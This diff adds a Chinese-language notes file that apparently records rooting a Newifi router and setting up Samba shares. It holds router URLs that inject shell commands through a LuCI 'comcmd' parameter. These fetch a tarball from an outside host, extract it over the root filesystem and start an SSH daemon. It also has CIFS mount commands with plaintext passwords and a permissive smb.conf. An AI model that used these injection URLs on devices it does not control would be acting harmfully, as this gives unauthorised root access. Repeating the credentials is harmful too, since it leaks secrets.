@@ -1,0 +1,71 @@
+= ssh 破解 =
+
+2. （可选步骤，还是做一下吧）在浏览器地址栏中继续输入：
+http://192.168.99.1/cgi-bin/luci/;stok=请将我替换成第一步中提取出来的字符串/admin/newwifi/comcmd?cmd=wget%20-O-%20http://xunkutech.qiniudn.com/README.txt
+
+3. 继续在浏览器地址栏中继续输入：
+http://192.168.99.1/cgi-bin/luci/;stok=请将我替换成第一步中提取出来的字符串/admin/newwifi/comcmd?cmd=wget%20-O-%20http://xunkutech.qiniudn.com/hacknewifi.tar.gz|tar%20-C%20/%20-zxvf-%26%26/etc/init.d/dropbear%20start
+
+root@newifi:/etc/samba# uname -a
+Linux newifi 3.4.56 #4 Tue Sep 23 18:41:22 CST 2014 mips GNU/Linux
+
+ 728 root       872 S    /sbin/hotplug2 --override --persistent --set-rules-file /etc/hotplug2.rules --set-coldplug-cmd /sbin/udevtrigger --max-children 1
+
+smbclient -L //192.168.99.163 -U lizhx%lizhx
+mount -t cifs //192.168.99.163/public/download /root/mypan/ -o username=root,password=fudao123
+mount -t cifs //192.168.99.163/public/download /mnt/mypan/ -o username=root,password=fudao123
+mount -t cifs //192.168.99.163/public/download /mnt/sdb1 -o username=lizhx,password=lizhx
+
+mount -t cifs ///192.168.99.163/public/download /mnt/sdb1/ -o username=root,password=fudao123
+mount -t cifs //192.168.99.163/public/download /mnt/sdb1/ -o username=root%fudao123
+
+root@newifi:/etc/samba# cat smb.conf
+[global]
+	netbios name = newifi 
+	display charset = UTF-8
+	interfaces = 127.0.0.1/8 lo 192.168.99.1/24 br-lan 
+	server string = newifi
+	unix charset = UTF-8
+	workgroup = WORKGROUP
+	browseable = yes
+	deadtime = 30
+	domain master = yes
+	encrypt passwords = true
+	enable core files = no
+	guest account = root
+	guest ok = yes
+	#invalid users = root
+	local master = yes
+	load printers = no
+	map to guest = Bad User
+	max protocol = SMB2
+	min receivefile size = 16384
+	null passwords = yes
+	obey pam restrictions = yes
+	os level = 20
+	passdb backend = smbpasswd
+	preferred master = yes
+	printable = no
+	security = user
+	smb encrypt = disabled
+	smb passwd file = /etc/samba/smbpasswd
+	socket options = TCP_NODELAY IPTOS_LOWDELAY
+	syslog = 2
+	use sendfile = yes
+	writeable = yes
+	
+
+[homes]
+	comment     = Home Directories
+	browsable   = no
+	read only   = no
+	create mode = 0750
+
+[newifi_MNT_sda1]
+	path = /mnt/sda1
+	read only = no
+	guest ok = yes
+	create mask = 0700
+	directory mask = 0700
+
+root@newifi:/etc/samba# 
